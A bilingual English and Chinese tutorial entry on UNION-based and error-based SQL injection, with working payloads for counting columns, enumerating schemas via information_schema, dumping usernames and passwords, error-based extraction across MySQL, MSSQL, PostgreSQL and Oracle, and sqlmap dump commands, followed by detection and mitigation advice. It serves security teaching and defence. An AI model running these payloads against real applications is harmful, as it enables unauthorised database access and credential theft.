---
id: sqli-union-and-error
title_en: "SQL Injection, Part 2 — UNION and Error-Based"
title_zh: "SQL 注入（二）：联合查询与报错注入"
summary_en: In-band injection is the comfortable case, because the answer comes back in the response. This entry covers the three requirements UNION imposes and how to satisfy each, the full extraction chain through information_schema, and error-based injection — which works because an error message is an output channel that nobody access-controlled.
summary_zh: 带内注入是舒服的那种情况，因为答案直接跟着响应回来。这一篇讲 UNION 提出的三个硬性要求以及怎么逐个满足、讲经由 information_schema 的完整提取链，以及报错注入 —— 它之所以成立，是因为错误信息是一条没有人做过访问控制的输出通道。
tags: [web, sql-injection, union-based, error-based, information-schema]
tools: [sqlmap, Burp Suite, curl, mysql]
attck: [T1190]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Why in-band is the case you want

The previous entry split injection three ways by how data comes back. **In-band** means it comes back the way you would hope: in the response body, as data you can read. Within in-band there are two ways to get it there:

| Method | How the data surfaces | Requires |
|---|---|---|
| **`UNION`-based** | Your rows are merged into the application's result set and rendered on the page | That the query result is displayed, and that you can match the column count |
| **Error-based** | The database puts the data inside an error message | That errors are displayed or logged where you can see them |

Both are worth understanding even if modern targets usually block them, for two reasons: when they work they are dramatically faster (one request per value instead of dozens), and **the failure of in-band is what forces you into blind techniques** — so knowing why it fails tells you what to try when.

Notice that both depend on **an output channel that was never meant to be one**: the rendered result set in one case, the error message in the other. That is the theme of this entry.

### UNION, and its three requirements

`UNION` concatenates the results of two `SELECT` statements into one result set. That sounds like a free data channel, and it nearly is — subject to three constraints, each of which tells you what to do next.

**Requirement 1 — the same number of columns.**

```sql
SELECT id, name FROM users WHERE id = 1 UNION SELECT 1, 2
```

If the counts differ, the database raises an error rather than guessing. So **before anything else you must establish the column count of the original query**, and this is why every guide starts with "find the number of columns".

**Requirement 2 — compatible types per position.**

```sql
SELECT id, name, created_at FROM users WHERE id = 1 UNION SELECT 1, 2, 'x'
```

Position by position, the types must be convertible. Databases are lenient — MySQL will happily put a string where a number belongs, and `NULL` is compatible with everything — which is why the practical approach is to make your own row's columns `NULL` or strings wherever possible:

```sql
UNION SELECT NULL, NULL, NULL
```

`NULL` is the safest probe because it is valid for every type. When you need to place a value, put it in a position you have confirmed is a string.

**Requirement 3 — the original query has to work, or be made to return nothing.**

The whole statement must be syntactically valid and execute. That gives you a trick worth using every time:

```sql
?id=-1 UNION SELECT 1, 2, 3-- -
```

A negative id that matches nothing means **the original query returns zero rows**, so everything rendered on the page comes from your `UNION`. Without that, the real row is displayed alongside yours and you cannot tell which is which.

### Counting the columns

Two methods, and they are worth knowing separately because they behave differently.

**Method 1 — `ORDER BY n`.**

```sql
?id=1 ORDER BY 1-- -      ok
?id=1 ORDER BY 2-- -      ok
?id=1 ORDER BY 3-- -      ok
?id=1 ORDER BY 4-- -      error: Unknown column '4' in 'order clause'
```

`ORDER BY` can reference a column **position**, and referencing a position that does not exist is an error. So the last number that works is the column count. Two advantages: it does not change the result set (so nothing about the page looks different, which matters if something is watching), and it fails loudly and unambiguously.

**Method 2 — growing `UNION SELECT`.**

```sql
?id=1 UNION SELECT 1-- -              error: different number of columns
?id=1 UNION SELECT 1,2-- -            error
?id=1 UNION SELECT 1,2,3-- -          ok -> three columns
```

Slower to iterate, but it fails with a message that states the difference explicitly in MySQL (`The used SELECT statements have a different number of columns`), and it works in cases where `ORDER BY` is unavailable — for instance when the injection point is inside a subquery or after a `LIMIT`.

**Which to use first** depends on the situation. `ORDER BY` is quieter; `UNION` immediately gets you to the next step. In practice, try `ORDER BY` first and fall back.

### Finding which columns are displayed

Having the count is not the same as having output. The application may render only the second and fifth columns. So substitute recognisable markers:

```sql
?id=-1 UNION SELECT 111, 222, 333-- -
```

Look at the page for `111`, `222`, `333`. Whichever appear are your **displayable positions** — and the ones that do not appear are still usable for blind-style extraction but not for reading values directly.

A refinement worth knowing: if a position cannot hold a string (a numeric column rendered as a number), you may see your marker but not be able to put a string there on some engines. In that case use a numeric-friendly extraction (`ASCII()`, `LENGTH()`), or find another position that is a string.

### The extraction chain

With a displayable position, the standard chain is: **version and current context, then schema, then tables, then columns, then data.** Each step exists because you cannot know the next without the previous.

**The functions that tell you where you are** (dialect matters — this is the table to memorise):

| What you want | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Version | `version()` | `@@version` | `version()` | `banner` from `v$version` | `sqlite_version()` |
| Current database | `database()` | `db_name()` | `current_database()` | `ora_database_name` | — |
| Current user | `user()` | `system_user` | `current_user` | `user` | — |
| Current schema | `database()` | `schema_name()` | `current_schema()` | `sys_context('USERENV','CURRENT_SCHEMA')` | — |

```sql
?id=-1 UNION SELECT 1, version(), database(), user(), 5-- -
```

**Then the schema.** In MySQL and PostgreSQL, `information_schema` is a set of views describing everything:

```sql
-- databases (schemas) that exist
?id=-1 UNION SELECT 1, schema_name, 3 FROM information_schema.schemata-- -

-- tables in a database
?id=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables
     WHERE table_schema = database()-- -

-- columns of a table
?id=-1 UNION SELECT 1, column_name, 3 FROM information_schema.columns
     WHERE table_name = 'users'-- -
```

In MSSQL the equivalents are `sys.databases`, `sys.tables`, `sys.columns`, and `INFORMATION_SCHEMA` also exists. Oracle uses `all_tables`, `all_tab_columns`, `all_users`. SQLite has no `information_schema` at all — you read `sqlite_master` instead:

```sql
?id=-1 UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'-- -
```

That single table is often the fastest route on a SQLite target, because the schema is stored as the original `CREATE TABLE` text, with column names and even types.

**Then the data.**

```sql
?id=-1 UNION SELECT 1, username, password FROM users LIMIT 1 OFFSET 0-- -
```

One row at a time is correct but slow. **Concatenating a whole column into one string is the technique that makes `UNION` practical:**

| Dialect | Aggregate |
|---|---|
| MySQL | `GROUP_CONCAT(col SEPARATOR '|')` |
| PostgreSQL | `STRING_AGG(col, '|')` |
| MSSQL | `STRING_AGG(col, '|')` (2017+) or `FOR XML PATH('')` |
| Oracle | `LISTAGG(col, '|') WITHIN GROUP (ORDER BY 1)` |
| SQLite | `GROUP_CONCAT(col, '|')` |

```sql
?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name SEPARATOR '|'), 3
     FROM information_schema.tables WHERE table_schema = database()-- -
```

One request, every table name. That is the entire advantage of in-band over blind, and it is why the loss of in-band matters so much in practice.

**A useful assembly pattern for a single value.** When a value might be long, or you need to combine several, build it in one expression:

```sql
CONCAT(username, ':', password)                       -- MySQL
username || ':' || password                           -- PostgreSQL, Oracle, SQLite
username + ':' + password                             -- MSSQL
```

### Error-based injection, and why it works

Now the second channel. Error-based injection does not ask the database to *return* data — it asks the database to **complain about** data.

The mechanism, generically:

1. You construct an expression that the database will evaluate, whose *value* is something you want to read.
2. You wrap it so that the value ends up **inside an error message** — usually by passing it to a function that rejects its input and quotes that input in the error text.
3. The application, or the framework's debug mode, prints the database error to the page.

**Why this is a vulnerability class rather than a curiosity**: an error message is an output channel. It was designed for the developer's eyes and nobody ever asked whether an attacker could put their own content into it. Once you can, the attacker has a one-request data channel that requires no visible query output at all — the application never has to display a row.

**The five shapes**, by dialect:

| Dialect | Technique | Shape |
|---|---|---|
| MySQL | XML functions | `extractvalue(1, concat(0x7e, (SELECT ...)))` |
| MySQL | `floor` + `rand` + `group by` | `AND (SELECT 1 FROM (SELECT count(*), concat((SELECT ...), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)` |
| MySQL | numeric overflow | `exp(~(SELECT * FROM (SELECT version()) a))` |
| MSSQL | type conversion | `convert(int, (SELECT ...))` |
| PostgreSQL | type conversion | `cast((SELECT ...) as int)` |
| Oracle | named functions | `utl_inaddr.get_host_name((SELECT ...))` |

### MySQL, in detail

**XML functions.** `extractvalue()` and `updatexml()` take an XPath expression. If the XPath is invalid, MySQL raises an error **containing the offending XPath string** — which you control:

```sql
?id=1 AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
-- XPATH syntax error: '~5.7.34-log'

?id=1 AND updatexml(1, concat(0x7e, (SELECT database())), 1)-- -
-- XPATH syntax error: '~appdb'
```

Two details worth internalising:

- **`0x7e` is `~`**, used as a marker so you can find your data in the message. Without it, you are guessing where the injected part begins.
- **The output is truncated to 32 characters.** Longer values need `SUBSTRING` with an offset, taken in pieces — which is why a long dump through this technique is still dozens of requests.

**`floor()` + `rand()` + `group by`.** A more convoluted construction whose behaviour is a genuine quirk: when `GROUP BY` is evaluated, `rand()` may be called a different number of times than expected, producing a duplicate key — and the error text contains the value that collided:

```sql
?id=1 AND (SELECT 1 FROM (
       SELECT count(*), concat((SELECT database()), floor(rand(0)*2)) AS x
       FROM information_schema.tables GROUP BY x
     ) a)-- -
-- Duplicate entry 'appdb1' for key 'group_key'
```

The `1` appended to the database name is the `floor(rand(0)*2)` value that caused the collision. It is unreliable across versions (the query planner's behaviour is the whole mechanism), which is exactly why the XML functions are the first thing to try. The output limit here is around 64 characters.

**Numeric overflow.** Shorter and, on affected versions, cleaner:

```sql
?id=1 AND exp(~(SELECT * FROM (SELECT version()) a))-- -
-- DOUBLE value is out of range in 'exp(...)'
```

The version string appears inside the message. Like the `floor` variant, it depends on the server version and configuration, so try all three.

### MSSQL, PostgreSQL and Oracle in one line each

MSSQL's conversion error is the cleanest of all of them, because the error **states the value it could not convert**:

```sql
?id=1 AND 1=convert(int, @@version)-- -
-- Conversion failed when converting the varchar value 'Microsoft SQL Server 2019...' to data type int.
```

PostgreSQL:

```sql
?id=1 AND 1=cast(version() as int)-- -
-- invalid input syntax for type integer: "PostgreSQL 14.5 ..."
```

Oracle, where the technique relies on functions that raise errors containing their argument:

```sql
?id=1 AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -
```

Oracle's variants additionally depend on privileges and on which packages are installed, which is why Oracle testing often moves to blind techniques earlier.

### Error-based is disappearing, and why that matters

Two trends have reduced this family:

1. **Applications stop showing errors.** Frameworks default to a generic error page, production mode suppresses stack traces, and reverse proxies replace upstream error bodies. If you cannot see the message, the channel does not exist.
2. **The functions are named in WAF rules.** `extractvalue`, `updatexml`, `floor(rand`, `convert(int,` are all easy signatures, and — unlike a general `UNION` keyword — they have almost no legitimate use in a parameter.

When error output is gone, the fallback is **blind injection**, the next entry: no output, no errors, just a difference you can observe. It is slower by an order of magnitude and it is the reason blind techniques deserve their own entry.

**And one framing worth keeping**: suppressing errors is **removing a channel**, not fixing the query. The injection still exists. An application that hides its errors and concatenates its input has simply made it harder to exploit — which is defence in depth, and not remediation.

### The full chain, as a procedure

Everything above, in the order you would actually do it. Assume a MySQL target with a visible error and a rendered result set.

1. **Confirm the injection.** `?id=1'` errors, `?id=1''` works → the input is inside a string literal.
2. **Count columns.** `?id=1 ORDER BY 1-- -` and increment until it errors. Suppose it errors at 4 → three columns.
3. **Find display positions.** `?id=-1 UNION SELECT 111,222,333-- -` and look for the markers. Suppose 2 and 3 are shown.
4. **Identify the target.** `?id=-1 UNION SELECT 1,version(),database()-- -`
5. **List tables.** `?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -`
6. **List columns of the interesting table.** `?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -`
7. **Read the data.** `?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -`

`0x3a` is `:`, used as a separator. Note that step 7 reads everything in one request — the whole point of in-band.

**If error messages are visible but the result set is not**, the same chain runs through error-based payloads instead. The information is identical; only the channel differs.

### Tools, and where they belong

`sqlmap` automates all of this, and it is worth using when the goal is the data rather than understanding:

```bash
sqlmap -u "http://target/item?id=1" --batch --dbs
sqlmap -u "http://target/item?id=1" -D appdb --tables
sqlmap -u "http://target/item?id=1" -D appdb -T users --dump
sqlmap -u "http://target/item?id=1" --technique=U --risk=3 --level=5
```

Its real value is in choosing techniques and adjusting payloads automatically when the obvious ones are blocked — the subject of the last entry in this series. The reason to do it by hand at least once is that when a tool fails you need to know **which step failed**: wrong column count, no display position, errors suppressed, or a WAF. Those are four different problems with four different next moves, and a tool's error message does not usually tell you which one you have.

### Detection and mitigation

- **Debug pages are the whole channel, so the fix is to close it.** Displaying raw database errors to a client is a finding in itself, regardless of injection. Show a generic error, log the detail server-side with a request identifier, and let the developer correlate — that keeps the diagnostic value without handing the attacker an output channel.
- **Alert on the probing shape, not the keyword.** `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3` in sequence from one client; a marker probe like `111,222,333`; repeated `UNION SELECT` with growing column lists. These sequences are far more distinctive than any single payload, and they survive encoding and case variation because the shape is the signal.
- **Watch for schema reconnaissance.** Queries touching `information_schema`, `sys.tables`, `all_tables` or `sqlite_master` from an application account that has no reason to introspect its own schema are a strong signal. So is a query whose text never appears in the application's source.
- **Log the query with its parameters, and log the errors.** An error log without the query that produced it tells you an injection was attempted but not what it reached. Correlate by request id, and treat a spike in syntax errors from one source as an incident indicator rather than noise.
- **Signature the error-based functions specifically.** They have essentially no legitimate use in user input, so matching `extractvalue`, `updatexml`, `exp(~`, `floor(rand`, `convert(int,` and Oracle's `utl_inaddr` costs almost nothing and catches a family that keyword-only rules miss.
- **Least privilege limits what the chain can read.** An application account restricted to its own schema cannot enumerate other databases, and one without file privileges cannot use the injection to read or write files. The injection still works; the blast radius shrinks, and several rows of the extraction chain disappear.
- **And keep the perspective from part 1**: every control here is damage limitation or detection. The query that concatenates input is the vulnerability, and it is fixed by parameterising it — not by hiding its errors, however much hiding them helps.

<!-- lang:zh -->
### 为什么带内是你想要的那种情况

上一篇按"数据怎么回来"把注入分成三类。**带内**意味着它按你希望的方式回来：在响应体里，作为你能读到的数据。带内内部有两条把它送到那里的路：

| 方式 | 数据怎么浮现 | 需要什么 |
|---|---|---|
| **`UNION` 型** | 你的行被合并进应用的结果集里，渲染在页面上 | 查询结果会被显示，且你能对上列数 |
| **报错型** | 数据库把数据放进错误信息里 | 错误被显示出来，或者被记在你看得到的地方 |

两种都值得理解，即便现代目标通常会挡掉它们，理由有两个：它们能用的时候**快得多**（一个值一次请求，而不是几十次），而且**带内的失效正是把你逼进盲注的原因** —— 所以知道它为什么失效，就告诉你接下来该试什么。

注意两者都依赖**一条本不该是输出通道的输出通道**：一种情况下是渲染出来的结果集，另一种情况下是错误信息。这就是这一篇的主题。

### UNION，以及它的三个要求

`UNION` 把两条 `SELECT` 的结果拼成一个结果集。这听起来像一条免费的数据通道，而它几乎就是 —— 但要满足三个约束，而每一个都告诉你下一步做什么。

**要求一 —— 列数相同。**

```sql
SELECT id, name FROM users WHERE id = 1 UNION SELECT 1, 2
```

列数不一致时，数据库会报错而不是猜。所以**在做任何别的事之前，必须先确定原查询的列数** —— 这就是为什么所有指南都从"找列数"开始。

**要求二 —— 每个位置上的类型要兼容。**

```sql
SELECT id, name, created_at FROM users WHERE id = 1 UNION SELECT 1, 2, 'x'
```

逐位置上，类型必须可转换。数据库很宽容 —— MySQL 会很乐意把一个字符串放进数字该在的位置，而 `NULL` 与任何类型都兼容 —— 所以实用的做法是尽量把你那一行的列都做成 `NULL` 或字符串：

```sql
UNION SELECT NULL, NULL, NULL
```

`NULL` 是最安全的探针，因为它对每种类型都合法。当你需要放一个值时，把它放在你已经确认是字符串的那个位置。

**要求三 —— 原查询得能跑，或者被弄成返回空。**

整条语句必须语法正确并能执行。这里有一个每次都用得上的技巧：

```sql
?id=-1 UNION SELECT 1, 2, 3-- -
```

一个匹配不到任何东西的负数 id，意味着**原查询返回零行**，于是页面上的所有东西都来自你的 `UNION`。不加这个，真实那一行会跟你的行一起显示，你分不清哪个是哪个。

### 数列数

两种方法，值得分开掌握，因为它们的表现不同。

**方法一 —— `ORDER BY n`。**

```sql
?id=1 ORDER BY 1-- -      正常
?id=1 ORDER BY 2-- -      正常
?id=1 ORDER BY 3-- -      正常
?id=1 ORDER BY 4-- -      报错：Unknown column '4' in 'order clause'
```

`ORDER BY` 可以引用列的**位置**，而引用一个不存在的位置会报错。所以最后一个能用的数字就是列数。两个好处：它不改变结果集（页面看不出任何变化，这在有人在盯着的时候有意义），而且它失败得响亮且明确。

**方法二 —— 逐步加长的 `UNION SELECT`。**

```sql
?id=1 UNION SELECT 1-- -              报错：列数不同
?id=1 UNION SELECT 1,2-- -            报错
?id=1 UNION SELECT 1,2,3-- -          正常 -> 三列
```

迭代起来更慢，但 MySQL 的报错会明确说明差异（`The used SELECT statements have a different number of columns`），而且在 `ORDER BY` 不可用时它能用 —— 比如注入点在子查询里、或者在 `LIMIT` 之后。

**先试哪个**取决于场景。`ORDER BY` 更安静；`UNION` 直接把你带到下一步。实践中先试 `ORDER BY`，不行再退回来。

### 找出哪几列会被显示

知道列数不等于有输出。应用可能只渲染第二列和第五列。所以换上好认的标记：

```sql
?id=-1 UNION SELECT 111, 222, 333-- -
```

在页面里找 `111`、`222`、`333`。**出现的就是你的可显示位置** —— 没出现的那些仍然能用于盲注式提取，但不能直接读值。

一个值得知道的细节：如果某个位置装不下字符串（一个以数字形式渲染的数字列），你可能看得到标记，却无法在某些引擎上把字符串放进去。这种情况下改用对数字友好的提取（`ASCII()`、`LENGTH()`），或者换一个确实是字符串的位置。

### 提取链

有了可显示位置，标准链条就是：**版本与当前上下文 → 库 → 表 → 列 → 数据**。每一步的存在，都是因为不知道上一步就无法知道下一步。

**告诉你自己在哪儿的那些函数**（方言很重要 —— 这是要背的表）：

| 想要什么 | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| 版本 | `version()` | `@@version` | `version()` | `v$version` 的 `banner` | `sqlite_version()` |
| 当前库 | `database()` | `db_name()` | `current_database()` | `ora_database_name` | —— |
| 当前用户 | `user()` | `system_user` | `current_user` | `user` | —— |
| 当前 schema | `database()` | `schema_name()` | `current_schema()` | `sys_context('USERENV','CURRENT_SCHEMA')` | —— |

```sql
?id=-1 UNION SELECT 1, version(), database(), user(), 5-- -
```

**然后是库结构。** 在 MySQL 和 PostgreSQL 里，`information_schema` 是一组描述一切的视图：

```sql
-- 存在哪些库（schema）
?id=-1 UNION SELECT 1, schema_name, 3 FROM information_schema.schemata-- -

-- 某个库里的表
?id=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables
     WHERE table_schema = database()-- -

-- 某张表的列
?id=-1 UNION SELECT 1, column_name, 3 FROM information_schema.columns
     WHERE table_name = 'users'-- -
```

在 MSSQL 里对应的是 `sys.databases`、`sys.tables`、`sys.columns`，同时 `INFORMATION_SCHEMA` 也存在。Oracle 用 `all_tables`、`all_tab_columns`、`all_users`。SQLite **完全没有** `information_schema` —— 你要读 `sqlite_master`：

```sql
?id=-1 UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'-- -
```

在 SQLite 目标上，那一张表常常是最快的路，因为库结构以原始的 `CREATE TABLE` 文本形式存着，列名甚至类型都在里面。

**然后是数据。**

```sql
?id=-1 UNION SELECT 1, username, password FROM users LIMIT 1 OFFSET 0-- -
```

一次一行是对的，但慢。**把整列拼成一个字符串，才是让 `UNION` 变实用的技巧：**

| 方言 | 聚合函数 |
|---|---|
| MySQL | `GROUP_CONCAT(col SEPARATOR '|')` |
| PostgreSQL | `STRING_AGG(col, '|')` |
| MSSQL | `STRING_AGG(col, '|')`（2017+）或 `FOR XML PATH('')` |
| Oracle | `LISTAGG(col, '|') WITHIN GROUP (ORDER BY 1)` |
| SQLite | `GROUP_CONCAT(col, '|')` |

```sql
?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name SEPARATOR '|'), 3
     FROM information_schema.tables WHERE table_schema = database()-- -
```

一次请求，拿到所有表名。这就是带内相对盲注的全部优势，也是为什么在实践里失去带内这件事影响这么大。

**拼单个值的一个实用套路。** 当一个值可能很长、或者你要把几个组合起来时，用一个表达式拼好：

```sql
CONCAT(username, ':', password)                       -- MySQL
username || ':' || password                           -- PostgreSQL、Oracle、SQLite
username + ':' + password                             -- MSSQL
```

### 报错注入，以及它为什么成立

现在说第二条通道。报错注入不要求数据库**返回**数据 —— 它要求数据库**抱怨**数据。

机制，用通用的说法：

1. 你构造一个会被数据库求值的表达式，它的**值**就是你想读的东西。
2. 你把它包起来，让那个值最终落进**错误信息里** —— 通常是通过把它传给一个会拒绝其输入、并把该输入引用到错误文本里的函数。
3. 应用，或者框架的调试模式，把数据库错误打印到页面上。

**为什么这是一类漏洞而不是一件奇事**：错误信息是一条输出通道。它本来是给开发者看的，从来没有人问过攻击者能不能把自己的内容塞进去。一旦能塞，攻击者就得到了一条**一次请求取数据**的通道，而且完全不需要查询结果被显示 —— 应用一行数据都不用展示。

**五种形状**，按方言：

| 方言 | 手法 | 形状 |
|---|---|---|
| MySQL | XML 函数 | `extractvalue(1, concat(0x7e, (SELECT ...)))` |
| MySQL | `floor` + `rand` + `group by` | `AND (SELECT 1 FROM (SELECT count(*), concat((SELECT ...), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)` |
| MySQL | 数值溢出 | `exp(~(SELECT * FROM (SELECT version()) a))` |
| MSSQL | 类型转换 | `convert(int, (SELECT ...))` |
| PostgreSQL | 类型转换 | `cast((SELECT ...) as int)` |
| Oracle | 具名函数 | `utl_inaddr.get_host_name((SELECT ...))` |

### MySQL，详细说

**XML 函数。** `extractvalue()` 和 `updatexml()` 接受一个 XPath 表达式。如果 XPath 非法，MySQL 会抛出一个**包含那段非法 XPath 字符串**的错误 —— 而那段字符串由你控制：

```sql
?id=1 AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
-- XPATH syntax error: '~5.7.34-log'

?id=1 AND updatexml(1, concat(0x7e, (SELECT database())), 1)-- -
-- XPATH syntax error: '~appdb'
```

两个细节值得吃透：

- **`0x7e` 是 `~`**，用作标记，好让你在信息里找到自己的数据。没有它，你只能猜注入的部分从哪儿开始。
- **输出被截断到 32 个字符。** 更长的值需要用 `SUBSTRING` 配偏移量、分段取 —— 这就是为什么用这个手法导一个长东西仍然是几十次请求。

**`floor()` + `rand()` + `group by`。** 一个更绕的构造，它的行为是一个真实的怪癖：`GROUP BY` 求值时，`rand()` 被调用的次数可能与预期不同，从而产生一个重复键 —— 而错误文本里就带着那个撞上的值：

```sql
?id=1 AND (SELECT 1 FROM (
       SELECT count(*), concat((SELECT database()), floor(rand(0)*2)) AS x
       FROM information_schema.tables GROUP BY x
     ) a)-- -
-- Duplicate entry 'appdb1' for key 'group_key'
```

数据库名后面那个 `1` 就是造成碰撞的 `floor(rand(0)*2)` 的值。它跨版本不可靠（查询计划器的行为就是它的全部机制），这也正是为什么该先试 XML 函数。这里的输出上限大约 64 个字符。

**数值溢出。** 更短，在受影响的版本上也更干净：

```sql
?id=1 AND exp(~(SELECT * FROM (SELECT version()) a))-- -
-- DOUBLE value is out of range in 'exp(...)'
```

版本字符串出现在信息里。和 `floor` 那个变体一样，它取决于服务器版本与配置，所以三种都试。

### MSSQL、PostgreSQL、Oracle，各一句

MSSQL 的转换错误是所有里面最干净的，因为错误**会说出它无法转换的那个值**：

```sql
?id=1 AND 1=convert(int, @@version)-- -
-- Conversion failed when converting the varchar value 'Microsoft SQL Server 2019...' to data type int.
```

PostgreSQL：

```sql
?id=1 AND 1=cast(version() as int)-- -
-- invalid input syntax for type integer: "PostgreSQL 14.5 ..."
```

Oracle，那里的手法依赖会抛出"包含其参数"的错误的函数：

```sql
?id=1 AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -
```

Oracle 的各种变体还取决于权限和装了哪些包，这也是 Oracle 测试更早转向盲注的原因。

### 报错注入正在消失，以及这为什么重要

两个趋势削弱了这一族：

1. **应用不再显示错误。** 框架默认给通用错误页、生产模式屏蔽调用栈、反向代理替换上游的错误响应体。看不到信息，通道就不存在。
2. **这些函数被写进了 WAF 规则。** `extractvalue`、`updatexml`、`floor(rand`、`convert(int,` 都是容易匹配的特征，而且 —— 不同于笼统的 `UNION` 关键字 —— 它们在参数里几乎没有正当用途。

当错误输出没了，退路就是**盲注**，也就是下一篇：没有输出、没有报错，只有一个你能观察到的差别。它慢一个数量级，也正是盲注技术值得单独一篇的原因。

**还有一个值得保持的框架**：屏蔽报错是**移除一条通道**，不是修好查询。注入依然存在。一个隐藏错误、又拼接输入的应用，只是把它变得更难利用 —— 这是纵深防御，不是修复。

### 完整链条，写成流程

把上面所有东西按你实际会做的顺序排一遍。假设目标是 MySQL、错误可见、结果集会被渲染。

1. **确认注入。** `?id=1'` 报错，`?id=1''` 正常 → 输入在字符串字面量里。
2. **数列数。** `?id=1 ORDER BY 1-- -` 一直加到报错。假设到 4 报错 → 三列。
3. **找显示位。** `?id=-1 UNION SELECT 111,222,333-- -`，找标记。假设第 2、3 位被显示。
4. **确认目标。** `?id=-1 UNION SELECT 1,version(),database()-- -`
5. **列表名。** `?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -`
6. **列目标表的列名。** `?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -`
7. **读数据。** `?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -`

`0x3a` 是 `:`，用作分隔符。注意第 7 步一次请求读完所有东西 —— 这就是带内的全部意义。

**如果错误信息可见但结果集不可见**，同一条链改走报错型的载荷。信息完全一样，只是通道不同。

### 工具，以及它们的位置

`sqlmap` 把这一切自动化了，当目标是拿数据而不是理解原理时，它值得一用：

```bash
sqlmap -u "http://target/item?id=1" --batch --dbs
sqlmap -u "http://target/item?id=1" -D appdb --tables
sqlmap -u "http://target/item?id=1" -D appdb -T users --dump
sqlmap -u "http://target/item?id=1" --technique=U --risk=3 --level=5
```

它真正的价值在于自动挑技术、并在明显的手法被挡住时调整载荷 —— 那是本系列最后一篇的主题。而手工至少做一次的理由是：工具失败的时候，你需要知道**是哪一步失败了** —— 列数不对、没有显示位、错误被屏蔽，还是 WAF。这是四个不同的问题，有四种不同的下一步，而工具的错误信息通常不告诉你是哪一个。

### 检测与缓解

- **调试页面就是那条通道，所以修法就是关掉它。** 把原始数据库错误显示给客户端，本身就是一条发现项，与是否有注入无关。给客户端一个通用错误，把细节带请求标识符记在服务端，让开发者去关联 —— 这样既保留了诊断价值，又不把输出通道交给攻击者。
- **对探测的形状告警，而不是对关键词告警。** 同一客户端依次发来 `ORDER BY 1`、`ORDER BY 2`、`ORDER BY 3`；像 `111,222,333` 这样的标记探测；列数逐步加长的 `UNION SELECT` 反复出现。这些序列远比任何单个载荷有辨识度，而且它们能扛住编码与大小写变形，因为**形状本身就是信号**。
- **盯库结构侦察。** 一个没有理由自省自身结构的应用账号，去碰 `information_schema`、`sys.tables`、`all_tables` 或 `sqlite_master`，是很强的信号。一条其文本从不出现在应用源码里的查询，同样如此。
- **把查询连同参数记下来，也把错误记下来。** 一份没有产生它的那条查询的错误日志，只能告诉你"有人尝试注入"，告诉不了你"他碰到了什么"。用请求 id 关联，并把单一来源的语法错误突增当作事件指标而不是噪声。
- **单独给报错型的函数写特征。** 它们在用户输入里基本没有正当用途，所以匹配 `extractvalue`、`updatexml`、`exp(~`、`floor(rand`、`convert(int,` 以及 Oracle 的 `utl_inaddr` 几乎不花成本，却能抓到只靠关键词的规则漏掉的一整族。
- **最小权限限制这条链能读到什么。** 一个被限制在自身 schema 的应用账号无法枚举别的库；一个没有文件权限的账号无法利用注入读写文件。注入照样能用，但爆炸半径缩小了，而提取链上的好几行直接消失。
- **最后保持第一篇里的那个视角**：这里的每一项控制都是损害限制或检测。**拼接输入的查询才是漏洞**，而它靠参数化来修 —— 不是靠隐藏错误，不管隐藏错误有多大帮助。
